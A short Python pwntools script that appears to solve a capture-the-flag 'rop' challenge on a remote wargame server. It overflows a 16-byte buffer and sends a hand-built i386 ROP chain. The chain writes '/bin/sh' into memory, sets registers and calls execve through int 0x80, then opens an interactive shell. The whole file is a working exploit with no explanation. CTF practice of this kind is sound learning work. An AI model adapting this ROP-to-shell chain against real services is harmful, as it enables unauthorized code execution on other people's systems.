from pwn import *

context.arch = 'i386'

#p = process( './rop' )
p = remote( 'hackme.inndy.tw', 7704 )

payload = b'a' * 16

pop_esi_edi = 0x0804847f
pop_edx = 0x0806ecda
pop_eax = 0x080b8016
mov_dedx_eax = 0x0805466b
syscall = 0x080627cd

pop_ebx = 0x080481c9
pop_ecx = 0x080de769

data = 0x080ebd90 - 0x100

int0x80 = 0x0806c943

rop = flat( [ pop_edx, data, pop_eax, b'/bin', mov_dedx_eax, pop_edx, data+4, pop_eax, b'/sh\x00', mov_dedx_eax, pop_edx, 0, pop_ebx, data, pop_ecx, 0, pop_eax, 0xb, int0x80 ] )

raw_input()
p.sendline( payload + rop )

p.interactive()
